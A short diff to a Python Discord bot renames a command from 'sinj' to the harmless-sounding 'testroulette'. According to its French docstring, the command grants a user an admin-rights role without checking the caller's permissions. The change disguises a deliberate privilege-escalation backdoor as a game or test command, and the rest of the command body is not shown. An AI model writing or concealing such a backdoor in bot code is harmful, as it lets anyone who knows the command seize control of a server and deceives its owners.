@@ -10,7 +10,7 @@ bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_comma
 
 
 @bot.command()
-async def sinj(ctx, member: discord.Member = None):
+async def testroulette(ctx, member: discord.Member = None):
     """Attribue le rôle 'sinj' avec les droits administratifs à un utilisateur, sans vérifier ses permissions."""
 
     guild = ctx.guild
